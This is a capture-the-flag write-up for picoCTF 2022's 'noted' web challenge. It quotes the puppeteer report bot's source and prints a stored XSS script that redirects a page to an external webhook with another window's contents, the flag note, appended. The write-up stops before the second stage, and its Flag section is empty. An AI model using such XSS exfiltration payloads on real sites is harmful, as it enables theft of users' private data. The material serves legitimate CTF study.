# Overview
`Hard` `Web Exploitation` `picoCTF 2022`

# Description
I made a nice web app that lets you take notes. I'm pretty sure I've followed all the best practices so its definitely secure right?  
Note that the headless browser used for the "report" feature does not have access to the internet.  
Create an account at this [website](http://saturn.picoctf.net:64863/).
Source code: [noted.tar.gz](https://artifacts.picoctf.net/c/184/noted.tar.gz)

# Hints
- Are you *sure* I followed all the best practices?
- There's more than just HTTP(S)!
- Things that require user interaction normally in Chrome might not require it in Headless Chrome.

# Solution
I had to look around this website for a while before trying to piece things together

First thing I discovered was the ability to inject HTML code while creating new notes:

<kbd>![Screenshot](https://github.com/user-attachments/assets/ad43acff-e6a6-43dc-9e18-590cd2ca90db)</kbd>
<kbd>![Screenshot](https://github.com/user-attachments/assets/fe2a8bd6-0a9e-4567-afad-29b4e8bbda33)</kbd>

Next I downloaded the source code to see what else I could find in the backend. `web.js` there are the endpoints and server running interally on `localhost:8080`
More interestingly, `report.js` handles the `/report` endpoint. The description mentions that the report function does not have access to the internet...let's look at its code:

```js
async function run(url) {
	let browser;

	try {
		module.exports.open = true;
		browser = await puppeteer.launch({
			headless: true,
			pipe: true,
			args: ['--incognito', '--no-sandbox', '--disable-setuid-sandbox'],
			slowMo: 10
		});

		let page = (await browser.pages())[0]

		await page.goto('http://0.0.0.0:8080/register');
		await page.type('[name="username"]', crypto.randomBytes(8).toString('hex'));
		await page.type('[name="password"]', crypto.randomBytes(8).toString('hex'));

		await Promise.all([
			page.click('[type="submit"]'),
			page.waitForNavigation({ waituntil: 'domcontentloaded' })
		]);

		await page.goto('http://0.0.0.0:8080/new');
		await page.type('[name="title"]', 'flag');
		await page.type('[name="content"]', process.env.flag ?? 'ctf{flag}');

		await Promise.all([
			page.click('[type="submit"]'),
			page.waitForNavigation({ waituntil: 'domcontentloaded' })
		]);

		await page.goto('about:blank')
		await page.goto(url);
		await page.waitForTimeout(7500);

		await browser.close();
	} catch(e) {
		console.error(e);
		try { await browser.close() } catch(e) {}
	}

	module.exports.open = false;
}
```

A few important things to note here:
- The report endpoint is a puppeteer bot  
- It is a headless, non-sandboxed chromium browser (infamous for its lack of security)  
- The bot creates a new account with random credentials  
- Creates a new note with content as `process.env.flag` (the flag, of course)  
- The bot then opens the `url` we provide on the `/reports` page

I needed to create a plan for how to get the note created that contains the flag. I found a solution online using what's called a webhook

> A _**webhook**_ is a lightweight, event-driven communication that automatically sends data between applications via HTTP

The plan consisted of two things:
1. Saturn Servers
  A. Create a test account
  B. Plant a XSS (Cross-Site Script) script that sends the content of a "pwn" window to a webhook
2. Puppeteer Bot
  A. Open a new window named "pwn" which can be called through js
  B. Login to test account
  C. Access my notes page to run the script I planted

Before finishing the script, I need to create a webhook. I used a webhook.site to create a free webhook.  
Once the webhook URL is created, enter that URL into the script

The script that I will plant is this:

```js
<script>
  if (window.location.search.includes('pwn'))
    window.location = 'https://hooks.zapier.com/hooks/catch/21757851/2wwet5d/?' + window.open('', 'pwn').document.body.textContent
</script>
``` 

# Flag
``
